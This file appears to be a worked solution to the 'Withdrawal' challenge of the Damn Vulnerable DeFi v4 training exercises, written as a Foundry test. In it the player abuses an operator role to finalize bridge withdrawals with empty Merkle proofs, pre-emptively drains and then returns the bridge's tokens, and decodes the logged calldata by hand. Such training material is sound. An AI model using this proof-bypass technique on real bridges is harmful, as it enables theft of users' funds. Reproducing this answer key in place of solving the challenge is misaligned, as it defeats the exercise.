// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        skip(7 days);
        /**
        1.

        id
        eaebef7f15fdaa66 
        ecd4533eefea23a1
        83ced29967ea67bc
        4219b0f1f8b0d3ba
        
        timestamp
        0000000000000000
        0000000000000000
        0000000000000000
        0000000066729b63
        
        offset
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000060
        
        L1Forwarder.forwardMessage.selector  forwardMessage(uint256 nonce, address l2Sender, address target, bytes memory message)
        0000000000000000
        0000000000000000
        0000000000000000
        000000000000010401210a38
        
        nonce
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        
        l2Sender
        0000000000000000
        00000000328809bc
        894f92807417d2da
        d6b7c998c1afdac6
        
        target
        0000000000000000
        000000009c52b2c4
        a89e2be37972d18d
        a937cbad8aa8bd50
        
        offset
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000080
        
        length
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000044

        TokenBridge.executeTokenWithdrawal.selector
        81191e51
        
        receiver
        00000000000000000
        0000000328809bc89
        4f92807417d2dad6b
        7c998c1afdac60000
        
        amount (10ether)
        0000000000000000
        0000000000000000
        0000000000008ac7
        230489e800000000
        
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        000000000000
        */

        /**
        2. 
        amount (10ether)
        0000000000000000
        0000000000000000
        0000000000000000
        8ac7230489e80000

        3. 
        (999000ether)
        0000000000000000
        00000000ea475d60
        c118d7058bef4bdd
        9c32ba51139a74e0
        
        4.
        amount (10ether)
        0000000000000000
        0000000000000000
        0000000000000000
        8ac7230489e80000        
        */
        
        bytes memory message = abi.encodeCall( L1Forwarder.forwardMessage,
            (
                0,
                player, 
                address(l1TokenBridge), 
                abi.encodeCall( 
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, 
                        token.balanceOf(address(l1TokenBridge)) - 30 ether
                    )
                )
            )
        );

        l1Gateway.finalizeWithdrawal({
            nonce: 0,
            l2Sender: l2Handler,
            target: address(l1Forwarder),
            timestamp: block.timestamp - 7 days,
            message: message,
            proof: new bytes32[](0)
        });


        skip(7 days);

        l1Gateway.finalizeWithdrawal({
            nonce: 0,
            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            timestamp: 1718786915,
            message: abi.encodeCall( L1Forwarder.forwardMessage,
            (
                0,
                0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 
                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
                abi.encodeCall( 
                    TokenBridge.executeTokenWithdrawal,
                    ( 
                        0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
                        10 ether
                    )
                )
            )
            ),
            proof: new bytes32[](0)
        });
        
        l1Gateway.finalizeWithdrawal({
            nonce: 1,
            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            timestamp: 1718786965,
            message: abi.encodeCall( L1Forwarder.forwardMessage,
            (
                1,
                0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 
                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
                abi.encodeCall( 
                    TokenBridge.executeTokenWithdrawal,
                    ( 
                        0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
                        10 ether
                    )
                )
            )
            ),
            proof: new bytes32[](0)
        });

        l1Gateway.finalizeWithdrawal({
            nonce: 2,
            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            timestamp: 1718787050,
            message: abi.encodeCall( L1Forwarder.forwardMessage,
            (
                2,
                0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 
                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
                abi.encodeCall( 
                    TokenBridge.executeTokenWithdrawal,
                    ( 
                        0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
                        999000 ether
                    )
                )
            )
            ),
            proof: new bytes32[](0)
        });

        l1Gateway.finalizeWithdrawal({
            nonce: 3,
            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
            timestamp: 1718787127,
            message: abi.encodeCall( L1Forwarder.forwardMessage,
            (
                3,
                0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 
                0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
                abi.encodeCall( 
                    TokenBridge.executeTokenWithdrawal,
                    ( 
                        0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
                        10 ether
                    )
                )
            )
            ),
            proof: new bytes32[](0)
        });

        token.transfer(address(l1TokenBridge), token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
